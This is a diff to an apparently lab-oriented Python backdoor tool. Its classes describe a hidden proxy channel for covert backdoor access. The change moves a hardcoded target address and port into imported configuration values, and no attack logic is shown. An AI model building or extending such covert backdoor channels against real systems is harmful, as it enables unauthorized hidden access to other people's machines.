@@ -6,11 +6,16 @@ import random
 from datetime import datetime
 import subprocess
 
+# Import configuration variables from parent directory
+import sys
+import os
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from configuration import SERVER_IP, PROXY_PORT
 
 class HiddenChannel:
     """Hidden proxy channel for covert backdoor access"""
 
-    def __init__(self, listen_port=None, target_host='192.168.56.104', target_port=5555):
+    def __init__(self, listen_port=None, target_host=SERVER_IP, target_port=PROXY_PORT):
         # Port will be set during initialization to ensure availability
         self.listen_port = listen_port  # Don't generate random port yet
         self.target_host = target_host
@@ -328,7 +333,7 @@ class proxyManager:
 class Backdoorproxy:
     """Main manager for backdoor proxy operations"""
     
-    def __init__(self, target_host='192.168.56.104', target_port=5555):
+    def __init__(self, target_host=SERVER_IP, target_port=PROXY_PORT):
         self.target_host = target_host
         self.target_port = target_port
         self.channel = None
@@ -401,7 +406,7 @@ class Backdoorproxy:
 
 
 # Factory function to create backdoor proxy manager
-def create_backdoor_proxy(target_host='192.168.56.104', target_port=5555):
+def create_backdoor_proxy(target_host=SERVER_IP, target_port=PROXY_PORT):
     """Create backdoor proxy manager instance"""
     return Backdoorproxy(target_host, target_port)
 
